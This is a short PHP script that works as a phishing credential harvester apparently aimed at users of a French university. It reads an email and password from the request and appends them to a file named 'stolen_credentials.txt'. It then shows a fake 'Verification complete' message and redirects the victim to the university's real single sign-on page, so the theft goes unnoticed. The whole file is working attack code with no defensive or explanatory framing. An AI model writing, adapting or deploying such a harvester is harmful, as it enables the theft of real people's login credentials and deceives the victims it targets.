<?php
  $email = $_GET['email'];
  $pass = $_GET['password'];
  file_put_contents("stolen_credentials.txt", "Email: $email | Password: $pass\n", FILE_APPEND);
  echo "Verification complete. Redirecting...";
  header("Refresh: 2; URL=https://sso.u-pec.fr/cas/login?service=https%3A%2F%2Feprel.u-pec.fr%2Flogin%2Findex.php%3FauthCAS%3DCAS");
?>

